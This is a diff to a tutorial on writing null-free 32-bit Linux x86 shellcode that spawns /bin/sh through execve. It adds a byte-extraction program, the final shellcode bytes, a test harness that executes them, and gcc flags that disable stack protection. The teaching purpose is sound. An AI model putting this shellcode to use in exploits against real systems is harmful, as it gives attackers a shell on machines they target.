@@ -31,7 +31,7 @@ shell.
 | [exit](http://man7.org/linux/man-pages/man2/exit.2.html)     | `1`  | `int error_code` (exit code)          | -                                |
 | [execve](http://man7.org/linux/man-pages/man2/execve.2.html) | `11` | `char *pathname` (path to executable) | `char *const argv[]` (arguments) |
 
-Using this knowledge we can write the following assembly code.
+Using this knowledge we can write the following assembly code ([shell.asm](./shell.asm)).
 
 ```asm
 section .data
@@ -264,7 +264,7 @@ This will let `esp` have the value `/bin//sh\x00`. Can can see this below in
 
 ![Value of esp](img/test_str_2.png)
 
-### Completing the rest of the code
+#### Completing the rest of the code
 
 Now we can complete the rest of the code. We can first assign the string in
 `esp` to `ebx`
@@ -288,11 +288,14 @@ be called.
 ```
 
 Finally, we can do the syscall:
+
 ```asm
   int 0x80
 ```
 
-This gives the following code which should not contain any null bytes.
+This gives the following code ([shell2.asm](./shell2.asm)) which should not
+contain any null bytes.
+
 ```asm
 _start:
   xor eax, eax     ; set eax to 0
@@ -306,15 +309,88 @@ _start:
 
 ```
 
+We can make sure of this by compiling the code and looking at the generated
+shellcode.
 
-
+![Final code](img/final_assembly.png)
 
 ## Running the Shellcode
 
-**Compiling test.c**
+### Extracting the shellcode
 
-`test.c` needs to be compiled to target 32bit machines with stack protection
-turned off
+While we can extract the shellcode by hand using the `objdump` output, it can be
+a bit tedious. Therefore we can use the following code to dump the program
+compiled program in hex while ignoring the null bytes which are used elsewhere
+in the program ([get_shellcode.c](./get_shellcode.c)).
+
+```c
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+int main(int argc, char *argv[])
+{
+	char l = 1;
+	unsigned char buf;
+	int fd;
+
+	// Open program from CLI arguments
+	fd = open(argv[1], 0, S_IRUSR);
+
+	while(read(fd, &buf, 1))
+	{
+		// Ignore null bytes
+		if (buf == 0 && l == 1) {
+			printf(" \n");
+			l = 0;
+		}
+
+		// Print formatted shellcode
+		else if (buf) {
+			printf("\\x%02x", buf);
+			l = 1;
+		}
+	}
+
+	// close file handler
+	close(fd);
+}
+```
+
+We can now compile and run this program while passing the compiled `shell2`
+binary as an argument. This prints out all the hexcodes in the program so we try
+to find the line which corresponds to the `_start` section in our assembly code.
+Luckily since we still have the `objdump` output, we can just compare with that
+to find the correct shellcode.
+
+![Extracting shellcode](img/extracting_shellcode.png)
+
+So our final shellcode will be:
+
+```c
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\x0b\xcd\x80
+"
+```
+
+### Testing the shellcode
+
+To test if the shellcode is working, we can use the following program ([test.c](./test.c)).
+
+```c
+int main()
+{
+	// Shellcode will be used as a string
+	char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\x0b\xcd\x80";
+
+	// Run shellcode
+	(*(void(*)()) shellcode)();
+}
+```
+
+To compile this program, we need to pass some special flags to disable stack
+protections. Without these flags, the test program will get a segmentation
+fault. It also to be compiled to target 32-bit machines as the assembly code we
+have written is 32-bit.
 
 ```console
 $ gcc test.c -o test.out -m32 -fno-stack-protector -z execstack -no-pie
